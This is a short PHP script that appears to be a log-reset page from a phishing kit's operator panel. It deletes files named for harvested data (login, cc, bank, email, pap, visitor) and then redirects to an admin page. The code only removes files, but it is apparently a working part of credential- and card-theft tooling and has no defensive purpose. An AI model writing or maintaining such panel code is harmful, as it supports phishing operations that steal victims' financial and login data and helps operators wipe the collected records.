<?php
session_start();
error_reporting(0);
require_once('function/session.php');
unlink("../result/click.txt");
unlink("../result/login.txt");
unlink("../result/cc.txt");
unlink("../result/bank.txt");
unlink("../result/bot.txt");
unlink("../result/email.txt");
unlink("../result/visitor.txt");
unlink("../result/pap.txt");
echo "<script>window.location='/admin';</script>";
?>